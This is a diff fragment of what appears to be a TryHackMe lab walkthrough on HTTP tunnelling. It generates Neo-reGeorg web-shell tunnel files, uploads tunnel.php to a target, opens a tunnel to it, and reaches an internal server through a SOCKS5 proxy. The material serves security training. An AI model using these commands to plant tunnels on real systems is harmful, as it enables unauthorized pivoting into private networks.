@@ -112,8 +112,17 @@ root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
        => neoreg_servers/tunnel.jspx
        => neoreg_servers/tunnel_compatibility.jspx
        => neoreg_servers/tunnel.php
+```  
+
+The previous command generates encrypted Tunneling clients with `thm` key in the `neoreg_servers/` directory.  In our scenario, we will be uploading the `tunnel.php` file via the uploader machine. 
+
+- Creating an HTTP Tunnel
 ```
-
-
-
+root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://UPLOADER_IP/uploader/files/tunnel.php
+```
+- Access the app.thm.com machine via the HTTP Tunneling
+```
+root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+Welcome to APP Server!
+```  
 
